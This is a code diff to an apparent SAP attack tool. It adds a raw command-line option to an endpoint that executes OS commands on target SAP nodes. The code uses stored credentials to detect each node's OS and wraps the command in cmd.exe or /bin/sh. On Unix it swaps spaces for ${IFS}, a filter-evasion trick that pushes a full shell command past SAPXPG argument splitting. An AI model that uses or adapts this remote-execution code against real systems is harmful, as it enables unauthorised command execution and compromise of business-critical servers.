@@ -1282,7 +1282,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
     @app.route("/api/node/<sid>/exec_command", method="POST")
     def node_exec_command(sid):
-        """Execute an OS command on a node (synchronous)."""
+        """Execute an OS command on a node (synchronous).
+
+        Accepts either:
+          - cmdline: raw command (e.g. "ls -la") — auto-wrapped in shell
+          - command + params: explicit binary + params (legacy)
+        """
         response.content_type = "application/json"
         data = request.json or {}
         node = api.state.get_node(sid)
@@ -1290,8 +1295,38 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"error": f"Node {sid} not found"})
 
         method = data.get("method", "gateway")  # "gateway" or "sxpg"
+        cmdline = data.get("cmdline", "").strip()
         command = data.get("command", "").strip()
         params = data.get("params", "").strip()
+
+        # If cmdline provided, auto-detect OS and wrap in shell
+        if cmdline:
+            os_type = node.os_type or ""
+            # Auto-detect OS if unknown via RFC_SYSTEM_INFO
+            if not os_type and method == "sxpg":
+                creds = node.best_credentials()
+                if creds:
+                    try:
+                        with sapmap_rfc._get_connection(node, creds) as conn:
+                            info = conn.call("RFC_SYSTEM_INFO")
+                            export = info.get("RFCSI_EXPORT", {})
+                            if isinstance(export, dict):
+                                os_type = export.get("RFCOPSYS", "").strip()
+                                if os_type:
+                                    node.os_type = os_type
+                                    print(f"[*] {sid}: Auto-detected OS: "
+                                          f"{os_type}")
+                    except Exception:
+                        pass
+            is_win = any(w in os_type.lower()
+                         for w in ("windows", "nt", "win"))
+            if is_win:
+                command = "cmd.exe"
+                params = f"/C {cmdline}"
+            else:
+                command = "/bin/sh"
+                # Replace spaces with ${IFS} so SAPXPG doesn't split
+                params = "-c " + cmdline.replace(" ", "${IFS}")
 
         if not command:
             return json.dumps({"error": "No command specified"})
